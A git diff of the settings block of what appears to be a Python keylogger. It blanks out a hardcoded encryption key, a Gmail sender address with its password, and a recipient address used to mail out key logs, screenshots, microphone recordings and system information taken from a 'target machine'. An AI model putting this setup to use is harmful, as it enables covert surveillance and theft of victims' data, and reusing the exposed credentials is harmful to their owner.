@@ -41,7 +41,7 @@ screenshot_information = "screenshot.png"
 
 # encrypted files
 
-key = "kVJuBflcVLpR3Bdd6nwlu9IRLfsDTRVghmjSwOMcWm0="       # as encryption key
+key = ""       # as encryption key, genrate it from Cryptography folder
 
 keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
@@ -51,14 +51,14 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "wariskhanpathan007@gmail.com"
-password = "Admin@123"
+email_address = ""      #add senders email address
+password = ""            #add password
 
 username = getpass.getuser()        # to get username of target machine
 
-toaddr = "pwariskhan@gmail.com"
+toaddr = ""             #receivers email adders
 
-file_path = "C:\\Users\\ASUS\\PycharmProjects\\keylogger\\Logs"
+file_path = ""          #location where you want your logs to be stored
 extend = "\\"
 file_merge = file_path + extend
 
